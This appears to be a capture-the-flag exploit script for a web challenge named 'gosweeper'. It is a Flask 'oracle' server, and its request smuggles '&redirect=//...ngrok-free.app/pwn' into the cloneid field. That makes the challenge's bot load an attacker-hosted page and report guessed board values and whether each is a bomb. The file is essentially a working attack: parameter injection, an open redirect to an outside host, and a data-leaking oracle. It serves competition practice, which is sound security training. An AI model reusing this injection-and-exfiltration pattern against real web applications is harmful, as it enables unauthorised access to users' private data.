from flask import Flask, request, render_template
import requests

app = Flask(__name__)

import logging

log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)


@app.route("/pwn", methods=["GET"])
def pwn():
    # need to reload every time pwn.html
    with open("templates/pwn.html", "r") as t:
        template = t.read()

    return template


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/naslab", methods=["GET"])
def home():
    arguments = request.args

    is_bomb = arguments.get("is_bomb", "")

    if is_bomb == "false":
        color = "\x1b[32m"
    else:
        color = "\x1b[31m"

    guess = arguments.get("guess", "")

    print(color, f"CASELLA {guess}", "\x1b[0m")

    return "ok"


if __name__ == "__main__":
    userid = "c444[...]" # your userid here
    cookie = "MTcx[...]" # your session cookie here

    while True:
        to_guess = input("Value to guess: ")

        with open("pwn.html.template", "r") as t:
            template = t.read().replace("{guess}", to_guess).replace("{userid}", userid)

        with open("templates/pwn.html", "w") as t:
            t.write(template)

        headers = {"Cookie": f"session={cookie}"}
        requests.post(
            "https://gosweeper.challs.open.ecsc2024.it/checkboard",
            data={"cloneid": "&redirect=//3013-87-21-109-73.ngrok-free.app/pwn"},
            headers=headers,
        )

        try:
            print("[*] Started Oracle")

            app.run(port=5000)

        except KeyboardInterrupt:
            print("[*] Closing oracle")
